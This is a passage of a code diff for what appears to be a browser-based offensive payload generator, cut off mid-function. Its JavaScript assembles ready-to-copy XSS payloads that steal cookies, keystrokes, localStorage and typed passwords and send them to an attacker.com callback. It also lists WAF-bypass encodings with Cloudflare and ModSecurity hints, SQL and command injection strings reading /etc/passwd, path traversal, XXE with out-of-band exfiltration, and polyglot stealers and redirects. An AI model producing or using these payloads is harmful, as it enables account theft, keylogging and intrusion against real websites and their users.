+            toast.textContent = message; document.body.appendChild(toast);
+            setTimeout(() => { toast.style.opacity = '0'; toast.style.transition = 'opacity 0.5s ease'; setTimeout(() => toast.remove(), 500); }, 2500);
+        }
+        function escapeHTML(text) {
+            if (typeof text !== 'string') text = String(text);
+            const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
+            return text.replace(/[&<>"']/g, m => map[m]);
+        }
+        function addToExport(sectionId, contentArray) {
+            if (contentArray && contentArray.length > 0) { exportableContent[sectionId] = contentArray; }
+            else { delete exportableContent[sectionId]; }
+        }
+        function renderOutput(elementId, title, payloads, notes = "") {
+            const outputDiv = document.getElementById(elementId);
+            if (!outputDiv) return;
+            let outputHTML = `<div class="text-accent font-semibold mb-3">${escapeHTML(title)}</div>`;
+            if (notes) {
+                outputHTML += `<div class="text-sm text-warning mb-3 p-2 border border-dashed border-warning rounded-md bg-opacity-10 bg-warning">${escapeHTML(notes)}</div>`;
+            }
+            if (payloads && payloads.length > 0) {
+                payloads.forEach((item, index) => {
+                    const name = item.name ? `<div class="text-sm text-success mb-1">${escapeHTML(item.name)}:</div>` : `<div class="text-sm text-gray-500 mb-1">Payload #${index + 1}:</div>`;
+                    outputHTML += `<div class="mb-3">
+                        ${name}
+                        <pre class="clickable bg-pre border-default" onclick="copyToClipboard(this.textContent)">${escapeHTML(item.payload || item)}</pre>
+                    </div>`; // Use textContent for copy to get raw text
+                });
+            } else {
+                outputHTML += '<div class="text-gray-500">No payloads generated for this configuration.</div>';
+            }
+            outputDiv.innerHTML = outputHTML;
+            // Add raw payloads to export object
+            addToExport(elementId.replace('_output', ''), payloads.map(p => p.payload || p));
+        }
+
+
+        // --- XSS Functions ---
+        // Function to copy XSS payload by index from the global array
+        function copyXssPayloadByIndex(index) {
+            if (index >= 0 && index < currentXssPayloads.length) {
+                copyToClipboard(currentXssPayloads[index]);
+            } else {
+                console.error('Invalid payload index:', index);
+                showToast('Error copying payload!');
+            }
+        }
+        function generateXSS() {
+            const context = document.getElementById('xss_context').value;
+            const target = document.getElementById('xss_target').value;
+            const callback = document.getElementById('xss_callback').value.trim() || 'https://attacker.com/c';
+
+            // Clear previous payloads and reset the array
+            currentXssPayloads = [];
+            let output = '<div class="text-yellow-400 font-bold mb-2">XSS Payloads for ' + escapeHTML(context) + ' context (' + escapeHTML(target) + '):</div>';
+            let payloads = [];
+
+            // --- XSS Payload Generation Logic ---
+            if (context === 'html') {
+                if (target === 'basic') {
+                    payloads = [
+                        '<script>alert(1)<\/script>',
+                        '<img src=x onerror=alert(1)>',
+                        '<svg onload=alert(1)>',
+                        '<body onload=alert(1)>',
+                        '<iframe src="javascript:alert(1)"></iframe>',
+                        '<iframe srcdoc="<script>alert(1)<\/script>">',
+                        '<video><source onerror="alert(1)">',
+                        '<audio src=x onerror=alert(1)>',
+                        '<object data="javascript:alert(1)"></object>',
+                        '<embed src="javascript:alert(1)">',
+                        '<details open ontoggle="alert(1)">',
+                        '<marquee onstart="alert(1)">',
+                        '<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="alert(1)">', // 1x1 gif onload
+                        '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>',
+                        '<div onmouseover="alert(1)">Hover me</div>',
+                    ];
+                } else if (target === 'cookie') {
+                    payloads = [
+                        '<script>fetch("' + callback + '?c="+encodeURIComponent(document.cookie))<\/script>',
+                        '<img src=x onerror="fetch(\'' + callback + '?c=\'+encodeURIComponent(document.cookie))">',
+                        '<svg onload="navigator.sendBeacon(\'' + callback + '\', document.cookie)">',
+                        '<script>document.location="' + callback + '?c="+encodeURIComponent(document.cookie)<\/script>',
+                        '<script>new Image().src="' + callback + '?c="+encodeURIComponent(document.cookie)<\/script>',
+                        '<script>window.open("' + callback + '?c="+encodeURIComponent(document.cookie))<\/script>',
+                        '<iframe src="javascript:fetch(\''+ callback + '?c=\'+encodeURIComponent(document.cookie))"></iframe>',
+                        '<object data="javascript:fetch(\''+ callback + '?c=\'+encodeURIComponent(document.cookie))"></object>',
+                    ];
+                } else if (target === 'keylogger') {
+                    const keyloggerPayload = `<script>let k = ""; document.onkeypress = function(e) { k += e.key; if (k.length > 20) { fetch("${callback}?k=" + encodeURIComponent(k)); k = ""; } };<\/script>`;
+                    const keyloggerPayloadImg = `<img src=x onerror='let k = ""; document.onkeypress = function(e) { k += e.key; if (k.length > 20) { fetch("${callback}?k=" + encodeURIComponent(k)); k = ""; } };'>`;
+                     payloads = [keyloggerPayload, keyloggerPayloadImg];
+                } else if (target === 'webcam') {
+                     payloads = [
+                        '<script>navigator.mediaDevices.getUserMedia({video: true}).then(s => fetch("'+callback+'?cam=success")).catch(e => fetch("'+callback+'?cam=fail"));<\/script>',
+                        '<img src=x onerror=\'navigator.mediaDevices.getUserMedia({video: true}).then(s => fetch("'+callback+'?cam=success")).catch(e => fetch("'+callback+'?cam=fail"));\'>'
+                     ];
+                } else if (target === 'localstorage') {
+                    payloads = [
+                        '<script>fetch("' + callback + '?ls="+encodeURIComponent(JSON.stringify(localStorage)))<\/script>',
+                        '<img src=x onerror="fetch(\'' + callback + '?ls=\'+encodeURIComponent(JSON.stringify(localStorage)))">',
+                        '<script>for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i);fetch("' + callback + '?ls_k="+encodeURIComponent(k)+"&ls_v="+encodeURIComponent(localStorage.getItem(k)))}<\/script>',
+                        '<svg onload="fetch(\'' + callback + '?ls=\'+encodeURIComponent(JSON.stringify(localStorage)))"></svg>'
+                    ];
+                } else if (target === 'phishing') {
+                     payloads = [
+                        '<script>var p=prompt("Enter password for "+document.domain); if(p) fetch("'+callback+'?p="+encodeURIComponent(p));<\/script>',
+                        '<img src=x onerror=\'var p=prompt("Enter password for "+document.domain); if(p) fetch("'+callback+'?p="+encodeURIComponent(p));\'>',
+                        '<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999;" onclick="this.remove()"><div style="position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); background:white; padding:20px; border-radius:5px; color:black;">Login Required<br><input type="password" id="phish_pass"><button onclick="fetch(\''+callback+'?p=\'+encodeURIComponent(document.getElementById(\'phish_pass\').value));">Login</button></div></div>'
+                     ];
+                }
+            } else if (context === 'attribute') {
+                 if (target === 'basic') {
+                    payloads = [
+                        '" onmouseover="alert(1)',
+                        "' onmouseover='alert(1)",
+                        ' onmouseover=alert(1)',
+                        '" autofocus onfocus="alert(1)',
+                        "' autofocus onfocus='alert(1)",
+                        ' autofocus onfocus=alert(1)',
+                        '" style="width:100%;height:100%;position:fixed;top:0;left:0;z-index:999" onmouseover="alert(1)',
+                        '"><script>alert(1)<\/script>',
+                        '"><img src=x onerror=alert(1)>',
+                        '"><svg onload=alert(1)>',
+                        'javascript:alert(1)',
+                        ' JaVaScRiPt:alert(1)',
+                        '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'
+                    ];
+                } else if (target === 'cookie') {
+                     payloads = [
+                        '" onmouseover="fetch(\'' + callback + '?c=\'+encodeURIComponent(document.cookie))',
+                        "' onmouseover='fetch(\"" + callback + "?c=\"+encodeURIComponent(document.cookie))'",
+                        ' onmouseover=fetch("' + callback + '?c="+encodeURIComponent(document.cookie))',
+                        '"><script>fetch("' + callback + '?c="+encodeURIComponent(document.cookie))<\/script>',
+                        'javascript:fetch("' + callback + '?c="+encodeURIComponent(document.cookie))'
+                    ];
+                }
+                // Add other targets for attribute context if needed
+            } else if (context === 'javascript') {
+                 if (target === 'basic') {
+                    payloads = [
+                        '";alert(1);//',          // Break out of double quotes
+                        "';alert(1);//",          // Break out of single quotes
+                        '`;alert(1);//',          // Break out of backticks
+                        '<\/script><script>alert(1)<\/script>', // Break out of script tag
+                        '-alert(1)-',             // Inside arithmetic operation
+                        ' || alert(1)',           // Inside logical operation
+                        '});alert(1);({',         // Break out of function/object
+                        '}${alert(1)}{',          // Template literal injection
+                        'alert(1)',               // Direct injection if possible
+                        'eval(atob("YWxlcnQoMSk="))', // Base64 encoded
+                        'window["al"+"ert"](1)',  // String concatenation bypass
+                        '(function(){ alert(1) })()', // IIFE
+                        'setTimeout`alert\x281\x29`', // setTimeout with template literal
+                    ];
+                } else if (target === 'cookie') {
+                     payloads = [
+                        '";fetch("' + callback + '?c="+encodeURIComponent(document.cookie));//',
+                        "';fetch('" + callback + "?c='+encodeURIComponent(document.cookie));//",
+                        '`;fetch(`' + callback + '?c=${encodeURIComponent(document.cookie)}`);//',
+                        '<\/script><script>fetch("' + callback + '?c="+encodeURIComponent(document.cookie))<\/script>',
+                        '});fetch("' + callback + '?c="+encodeURIComponent(document.cookie));({',
+                        '|| fetch("' + callback + '?c="+encodeURIComponent(document.cookie))',
+                        'eval(atob("ZmV0Y2goJy'+btoa(callback+'?c=')+'.concat(encodeURIComponent(document.cookie)))"))', // Base64 fetch
+                    ];
+                }
+                 // Add other targets for javascript context if needed
+            } else if (context === 'css') {
+                 if (target === 'basic') {
+                    payloads = [
+                        'xss:expression(alert(1))', // IE only
+                        'background-image: url("javascript:alert(1)")',
+                        'background-image: url(JaVaScRiPt:alert(1))',
+                        'font-family: "</style><script>alert(1)<\/script>";', // Break out
+                        'behavior: url(/path/to/xss.htc);', // IE only
+                        '@import url("javascript:alert(1)");',
+                        '}</style><script>alert(1)<\/script>{', // Break out of style block
+                        'width: calc(expression(alert(1)));', // IE only
+                    ];
+                } else if (target === 'cookie') {
+                     payloads = [
+                        'background-image: url("javascript:fetch(\''+callback+'?c=\'+encodeURIComponent(document.cookie))")',
+                        'font-family: "</style><script>fetch(\''+callback+'?c=\'+encodeURIComponent(document.cookie))<\/script>";',
+                        '@import url("javascript:fetch(\''+callback+'?c=\'+encodeURIComponent(document.cookie))");',
+                     ];
+                }
+                 // Add other targets for css context if needed
+            } else if (context === 'url') {
+                 if (target === 'basic') {
+                    payloads = [
+                        'javascript:alert(1)',
+                        ' javascript:alert(1)', // Leading space bypass
+                        '\tjavascript:alert(1)', // Leading tab bypass
+                        '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6C%65%72%74(1)', // Mixed encoding
+                        'data:text/html,<script>alert(1)<\/script>',
+                        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+                        'vbscript:msgbox(1)', // IE only
+                        'JaVaScRiPt:alert(1)', // Case bypass
+                    ];
+                } else if (target === 'cookie') {
+                     payloads = [
+                        'javascript:fetch("' + callback + '?c="+encodeURIComponent(document.cookie))',
+                        'data:text/html,<script>fetch("' + callback + '?c="+encodeURIComponent(document.cookie))<\/script>',
+                        'data:text/html;base64,' + btoa('<script>fetch("' + callback + '?c="+encodeURIComponent(document.cookie))<\/script>'),
+                    ];
+                }
+                 // Add other targets for url context if needed
+            } else if (context === 'dom') {
+                 // DOM XSS often depends on source (e.g., location.hash) and sink (e.g., innerHTML)
+                 // These are examples of sinks being fed potentially attacker-controlled data
+                 if (target === 'basic') {
+                    payloads = [
+                        // Assuming input comes from URL hash (#) or query string (?)
+                        '#<img src=x onerror=alert(1)>', // Sink: element.innerHTML = location.hash.substring(1)
+                        '?name=<script>alert(1)<\/script>', // Sink: element.innerHTML = new URLSearchParams(location.search).get('name')
+                        '#"><script>alert(1)<\/script>', // Sink: element.outerHTML = '<a href="' + location.hash.substring(1) + '">Link</a>'
+                        '#javascript:alert(1)', // Sink: element.href = location.hash.substring(1)
+                        // Sinks using eval-like functions
+                        'eval("alert(1)")',
+                        'setTimeout("alert(1)", 0)',
+                        'setInterval("alert(1)", 5000)', // Be careful with interval
+                        'new Function("alert(1)")()',
+                        // Sinks modifying attributes
+                        'document.body.setAttribute("onload", "alert(1)")',
+                        // Sinks modifying CSS
+                        'document.body.style.backgroundImage = "url(\'javascript:alert(1)\')"',
+                    ];
+                } else if (target === 'cookie') {
+                     payloads = [
+                        '#<img src=x onerror="fetch(\''+callback+'?c=\'+document.cookie)">',
+                        '?name=<script>fetch("'+callback+'?c="+document.cookie)<\/script>',
+                        '#javascript:fetch("'+callback+'?c="+document.cookie)',
+                        'eval("fetch(\''+callback+'?c=\'+document.cookie)")',
+                        'setTimeout("fetch(\''+callback+'?c=\'+document.cookie)",0)',
+                        'document.body.setAttribute("onload", "fetch(\''+callback+'?c=\'+document.cookie)")',
+                     ];
+                }
+                 // Add other targets for dom context if needed
+            }
+            // --- End of XSS Payload Generation Logic ---
+
+            // Add the payloads to the output
+            for (let i = 0; i < payloads.length; i++) {
+                const originalPayload = payloads[i];
+                const escapedPayload = escapeHTML(originalPayload);
+                // Store the original payload and get its index
+                currentXssPayloads.push(originalPayload);
+                const payloadIndex = currentXssPayloads.length - 1;
+
+                output += `<div class="mb-2">
+                    <div class="text-sm text-gray-500 mb-1">Payload #${i + 1}:</div>
+                    <pre class="clickable" onclick="copyXssPayloadByIndex(${payloadIndex})">${escapedPayload}</pre>
+                </div>`;
+            }
+
+            // Add advanced WAF bypass versions (based on the first generated payload)
+            output +=
+                '<div class="text-yellow-400 font-bold mt-4 mb-2">WAF Bypass Variants (Based on Payload #1):</div>';
+
+            if (payloads.length > 0) {
+                const basePayload = payloads[0]; // Use the first generated payload as a base
+                const wafBypassVariantsRaw = [
+                    basePayload.replace(/alert/g, 'window["al\\u0065rt"]'), // Unicode escape
+                    basePayload.replace(/alert/g, 'top[/al/.source+/ert/.source]'), // Regex source
+                    basePayload.replace(/alert\(1\)/g, 'alert(String.fromCharCode(49))'), // String.fromCharCode
+                    basePayload.replace(/script/gi, 'ScRiPt'), // Mixed case tags
+                    basePayload.replace(/onerror/gi, 'oNeRrOr'), // Mixed case event handler
+                    basePayload.replace(/</g, '%BC'), // URL Encoded < (less common)
+                    basePayload.replace(/>/g, '%BE'), // URL Encoded > (less common)
+                    basePayload.replace(/ /g, '/**/'), // Comments for spaces
+                    basePayload.replace(/\(/g, '%28').replace(/\)/g, '%29'), // URL Encoded parens
+                    basePayload.replace(/alert\(1\)/g, '[].filter.constructor(atob("YWxlcnQoMSk="))()'), // constructor + base64
+                    basePayload.replace(/<script>/g, '<script%0A>').replace(/<\/script>/g, '</script%0A>'), // Newlines
+                ];
+
+                for (let i = 0; i < wafBypassVariantsRaw.length; i++) {
+                    const originalPayload = wafBypassVariantsRaw[i];
+                    const escapedPayload = escapeHTML(originalPayload);
+                    // Store the original payload and get its index
+                    currentXssPayloads.push(originalPayload);
+                    const payloadIndex = currentXssPayloads.length - 1;
+
+                    output += `<div class="mb-2">
+                        <div class="text-sm text-gray-500 mb-1">WAF Bypass #${i + 1}:</div>
+                        <pre class="clickable" onclick="copyXssPayloadByIndex(${payloadIndex})">${escapedPayload}</pre>
+                    </div>`;
+                }
+            } else {
+                 output += '<div class="text-gray-500">Generate a base payload first to see WAF variants.</div>';
+            }
+
+            document.getElementById('xss_output').innerHTML = output;
+        }
+        function copyXSS() {
+            // Copy all payloads currently stored in the array
+            if (currentXssPayloads.length > 0) {
+                copyToClipboard(currentXssPayloads.join('\n\n'));
+            } else {
+                showToast('No XSS payloads generated yet!');
+            }
+        }
+        // --- WAF Bypass Function ---
+        function generateWAFBypass() {
+            const wafType = document.getElementById('waf_type').value;
+            const payloadType = document.getElementById('waf_payload_type').value;
+            const sample = document.getElementById('waf_sample').value; // Sample payload isn't used yet, but could be for mutation
+
+            let output = `<div class="text-yellow-400 font-bold mb-2">WAF Bypass Techniques for ${escapeHTML(wafType)} / ${escapeHTML(payloadType)}:</div>`;
+            let techniques = [];
+
+            // --- WAF Bypass Generation Logic ---
+            if (payloadType === 'xss') {
+                output += '<div class="mb-4"><div class="text-green-400 font-bold">Generic XSS Encoding/Obfuscation:</div>';
+                techniques = [
+                    {name: "HTML Entities (Decimal)", payload: "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"},
+                    {name: "HTML Entities (Hex)", payload: "&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;"},
+                    {name: "URL Encoding", payload: "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"},
+                    {name: "Double URL Encoding", payload: "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E"},
+                    {name: "Unicode Escapes (JS)", payload: "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E"},
+                    {name: "Mixed Case Tags", payload: "<ScRiPt>alert(1)<\/sCrIpT>"},
+                    {name: "Mixed Case Handler", payload: "<img src=x oNeRrOr=alert(1)>"},
+                    {name: "Null Byte Tag", payload: "<scri%00pt>alert(1)</scri%00pt>"},
+                    {name: "Null Byte Handler", payload: "<img src=x onerror%00=alert(1)>"},
+                    {name: "Tab/Newline Separation", payload: "<img\tsrc=x\nonerror=alert(1)>"},
+                    {name: "Grave Accent Execution", payload: "<svg/onload=alert`1`>"},
+                    {name: "String Concatenation", payload: "<script>window['a'+'lert'](1)<\/script>"},
+                    {name: "Base64 Execution", payload: "<script>eval(atob('YWxlcnQoMSk='))<\/script>"},
+                    {name: "Data URI", payload: "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>"},
+                    {name: "SVG Animation", payload: "<svg><animate onbegin=alert(1) attributeName=x></svg>"},
+                    {name: "Comment Bypass", payload: "<img src=x onerror=//'\\n alert(1)>"}, // JS comment
+                    {name: "HTML Comment Bypass", payload: "<img src=x<!-- -->onerror<!-- -->=alert(1)>"},
+                ];
+            } else if (payloadType === 'sqli') {
+                 output += '<div class="mb-4"><div class="text-green-400 font-bold">Generic SQLi Obfuscation/Bypass:</div>';
+                 techniques = [
+                    {name: "Inline Comment (/**/)", payload: "UNION/**/SELECT/**/NULL,version()--"},
+                    {name: "Inline Comment (#...\\n)", payload: "UNION#foo\\nSELECT#bar\\nNULL,version()--"},
+                    {name: "Inline Comment (-- ...\\n)", payload: "UNION--foo\\nSELECT--bar\\nNULL,version()--"},
+                    {name: "URL Encoded Space (%20)", payload: "UNION%20SELECT%20NULL,version()--"},
+                    {name: "URL Encoded Space (+)", payload: "UNION+SELECT+NULL,version()--"},
+                    {name: "URL Encoded Comment (%23)", payload: "UNION%23foo%0ASELECT%23bar%0ANULL,version()--"},
+                    {name: "Double URL Encoding", payload: "UNION%2520SELECT%2520NULL,version()--"},
+                    {name: "Unicode Space (%u0020)", payload: "UNION%u0020SELECT%u0020NULL,version()--"}, // Less common
+                    {name: "Keyword Case Bypass", payload: "uNiOn sElEcT NuLl,version()--"},
+                    {name: "Function Equivalence (@@version)", payload: "UNION SELECT NULL,@@version--"},
+                    {name: "Function Equivalence (MID)", payload: "UNION SELECT NULL,MID(version(),1,10)--"},
+                    {name: "Numeric Obfuscation (Hex)", payload: "AND 1=0x1"},
+                    {name: "Numeric Obfuscation (Scientific)", payload: "AND 1=1e0"},
+                    {name: "String Concatenation (MySQL)", payload: "UNION SELECT NULL,CONCAT('ver','sion()')--"},
+                    {name: "String Concatenation (MSSQL)", payload: "UNION SELECT NULL,'ver'+'sion()'--"},
+                    {name: "String Concatenation (Oracle)", payload: "UNION SELECT NULL,'ver'||'sion()' FROM dual--"},
+                    {name: "Whitespace Alternatives (%09, %0A, %0C, %0D)", payload: "UNION%0ASELECT%0ANULL,version()--"},
+                    {name: "Versioned Comments (MySQL)", payload: "/*!50000UNION*/ /*!50000SELECT*/ NULL,version()--"},
+                    {name: "Parenthesis Obfuscation", payload: "UNION(SELECT(NULL),version())--"},
+                 ];
+            } else if (payloadType === 'cmdi') {
+                 output += '<div class="mb-4"><div class="text-green-400 font-bold">Generic Command Injection Bypass:</div>';
+                 techniques = [
+                    {name: "Semicolon", payload: "; ls -al"},
+                    {name: "Pipe", payload: "| ls -al"},
+                    {name: "Double Pipe (||)", payload: "|| ls -al"}, // Executes if previous fails
+                    {name: "Double Ampersand (&&)", payload: "&& ls -al"}, // Executes if previous succeeds
+                    {name: "Newline (%0A)", payload: "%0Als -al"},
+                    {name: "Backticks", payload: "`ls -al`"},
+                    {name: "Dollar Parentheses", payload: "$(ls -al)"},
+                    {name: "IFS Bypass ($IFS)", payload: "cat${IFS}/etc/passwd"},
+                    {name: "IFS Bypass ($IFS$9)", payload: "cat$IFS$9/etc/passwd"}, // $9 is often space/tab
+                    {name: "Globbing (*?)", payload: "/bin/cat /etc/pass*"},
+                    {name: "Variable Expansion", payload: "X=ls; $X -al"},
+                    {name: "Command Substitution in String", payload: "echo \"`id`\""},
+                    {name: "Single Quote Bypass", payload: "l's' -al"},
+                    {name: "Double Quote Bypass", payload: "l\"s\" -al"},
+                    {name: "Backslash Escape", payload: "\\l\\s -al"},
+                    {name: "Hex Encoding (printf)", payload: "$(printf '\\x6c\\x73\\x20\\x2d\\x61\\x6c')"},
+                    {name: "Base64 Encoding", payload: "`echo bHMgLWFs | base64 -d`"},
+                 ];
+            } else if (payloadType === 'path') {
+                 output += '<div class="mb-4"><div class="text-green-400 font-bold">Generic Path Traversal Bypass:</div>';
+                 techniques = [
+                    {name: "Standard", payload: "../../../etc/passwd"},
+                    {name: "URL Encoded (%2e%2e%2f)", payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"},
+                    {name: "Double URL Encoded (%252e%252e%252f)", payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"},
+                    {name: "Backslash (Windows)", payload: "..\\..\\..\\windows\\win.ini"},
+                    {name: "URL Encoded Backslash (%2e%2e%5c)", payload: "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows\\win.ini"},
+                    {name: "Mixed Slashes", payload: "../../..//etc/passwd"},
+                    {name: "Null Byte (%00)", payload: "../../../etc/passwd%00.jpg"},
+                    {name: "Extra Slashes", payload: "///etc/passwd"},
+                    {name: "Relative from Root", payload: "/etc/passwd"},
+                    {name: "UNC Path (Windows)", payload: "\\\\localhost\\c$\\windows\\win.ini"},
+                 ];
+            } else if (payloadType === 'xxe') {
+                 output += '<div class="mb-4"><div class="text-green-400 font-bold">Generic XXE Payloads:</div>';
+                 techniques = [
+                    {name: "Local File Read", payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`},
+                    {name: "SSRF (HTTP)", payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.service/secret">]><foo>&xxe;</foo>`},
+                    {name: "Parameter Entities (OOB)", payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/log?data="><!ENTITY % param "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%xxe;'>">%param;]><foo></foo>`},
+                    {name: "Parameter Entities (Error Based)", payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%file;]><foo></foo>`},
+                    {name: "PHP Wrapper (Base64)", payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">]><foo>&xxe;</foo>`},
+                    {name: "CDATA Bypass", payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "<![CDATA[<!ENTITY % file SYSTEM 'file:///etc/passwd'>]]>"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%xxe;]><foo></foo>`},
+                    {name: "Billion Laughs (DoS)", payload: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!-- ... more entities ... -->]><lolz>&lol9;</lolz>`},
+                 ];
+            }
+            // --- End of WAF Bypass Generation Logic ---
+
+            // Add WAF-specific hints if applicable
+            if (wafType === 'cloudflare' && payloadType === 'xss') {
+                 output += '<div class="mb-4"><div class="text-green-400 font-bold">Cloudflare Specific Hints (XSS):</div>';
+                 output += '<div>- Often blocks common event handlers (onerror, onload). Try less common ones (onmouseover, onfocus, ontoggle).</div>';
+                 output += '<div>- SVG vectors can sometimes bypass filters.</div>';
+                 output += '<div>- May normalize or block certain character encodings. Test various types.</div>';
+                 output += '<div>- JavaScript obfuscation (string manipulation, complex function calls) might work.</div>';
+                 output += '</div>';
+            } else if (wafType === 'modsecurity' && payloadType === 'sqli') {
+                 output += '<div class="mb-4"><div class="text-green-400 font-bold">ModSecurity Specific Hints (SQLi):</div>';
+                 output += '<div>- Core Rule Set (CRS) is common. Review CRS rules.</div>';
+                 output += '<div>- Often sensitive to whitespace and comments. Try alternatives (%0A, /**/, #).</div>';
+                 output += '<div>- May block common SQL functions. Try alternatives or obfuscated versions.</div>';
+                 output += '<div>- Payloads split across parameters might bypass some rules.</div>';
+                 output += '</div>';
+            }
+            // Add more WAF-specific hints here...
+
+
+            if (techniques.length > 0) {
+                techniques.forEach((tech, index) => {
+                    output += `<div class="mb-2">
+                        <div class="text-sm text-gray-500 mb-1">${escapeHTML(tech.name)}:</div>
+                        <pre class="clickable" onclick="copyToClipboard('${escapeHTML(tech.payload)}')">${escapeHTML(tech.payload)}</pre>
+                    </div>`;
+                });
+            } else {
+                 output += '<div class="text-gray-500">No specific techniques generated for this combination yet.</div>';
+            }
+
+            document.getElementById('waf_output').innerHTML = output;
+        }
+
+        function generatePolyglot() {
+            const techs = document.querySelectorAll('.polyglot-tech:checked');
+            const action = document.getElementById('polyglot_action').value;
+            const params =
+                document.getElementById('polyglot_params').value.trim() ||
+                'https://attacker.com/c'; // Trim params
+
+            let technologies = [];
+            techs.forEach(tech => technologies.push(tech.value));
+
+            let output = `<div class="text-yellow-400 font-bold mb-2">Polyglot Payloads (${escapeHTML(action)}):</div>`;
+            let polyglots = [];
+
+            // --- Polyglot Generation Logic ---
+            if (action === 'alert') {
+                polyglots = [
+                    {
+                        name: "HTML/JS/SVG/Attribute PoC",
+                        payload: "javascript:/*--></title></style></textarea><\/script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+                        contexts: ["html", "js", "svg", "attribute"]
+                    },
+                    {
+                        name: "HTML/JS/Attribute/CSS PoC",
+                        payload: "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed><\/script><html \"onmouseover=/*&lt;svg/*/onload=alert(1)//>",
+                        contexts: ["html", "js", "attribute", "css"]
+                    },
+                    {
+                        name: "Markdown/HTML/JS PoC",
+                        payload: "[a](javascript:prompt(document.domain))\n<a href=\"javascript:alert(1)\">Click</a>\n<img src=x onerror=alert(1)>",
+                        contexts: ["html", "js", "markdown"]
+                    },
+                    {
+                        name: "HTML/Attribute PoC (Focus)",
+                        payload: "\" autofocus onfocus=alert(document.domain) x=\"",
+                        contexts: ["html", "attribute"]
+                    },
+                    {
+                        name: "XML/HTML/SVG PoC",
+                        payload: "<?xml version=\"1.0\"?><!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>",
+                        contexts: ["html", "xml", "svg"]
+                    }
+                ];
+            } else if (action === 'fetch') {
+                 polyglots = [
+                    {
+                        name: "HTML/JS/SVG/Attribute Cookie Stealer",
+                        payload: "javascript:/*--></title></style></textarea><\/script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+fetch(`"+params+"?c=${document.cookie}`)//'>",
+                        contexts: ["html", "js", "svg", "attribute"]
+                    },
+                    {
+                        name: "HTML/JS/Attribute LocalStorage Stealer",
+                        payload: "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed><\/script><html \"onmouseover=/*&lt;svg/*/onload=fetch('"+params+"',{method:'POST',body:JSON.stringify(localStorage)})//>",
+                        contexts: ["html", "js", "attribute"]
+                    },
+                    {
+                        name: "Markdown/HTML/JS Cookie Stealer",
+                        payload: "[a](javascript:fetch(`"+params+"?c=${document.cookie}`))\n<a href=\"javascript:navigator.sendBeacon('"+params+"',document.cookie)\">Click</a>\n<img src=x onerror=fetch(`"+params+"?c=${document.cookie}`)>",
+                        contexts: ["html", "js", "markdown"]
+                    }
+                ];
+            } else if (action === 'redirect') {
+                const targetUrl = params || 'https://attacker.com'; // Default redirect target
+                 polyglots = [
+                    {
+                        name: "HTML/JS/Attribute Redirect",
+                        payload: "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed><\/script><html \"onmouseover=/*&lt;svg/*/onload=location='"+targetUrl+"'//>",
+                        contexts: ["html", "js", "attribute"]
+                    },
+                    {
+                        name: "HTML/JS/SVG Redirect",
+                        payload: "javascript:/*--></title></style></textarea><\/script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+location=`"+targetUrl+"`//'>",
+                        contexts: ["html", "js", "svg"]
+                    },
+                    {
+                        name: "HTML Meta Refresh Redirect",
+                        payload: "<meta http-equiv=\"refresh\" content=\"0; url="+targetUrl+"\">",
+                        contexts: ["html"]
+                    }
+                ];
+            } else if (action === 'defacement') {
+                 polyglots = [
+                     {
+                        name: "HTML/JS Deface (Simple)",
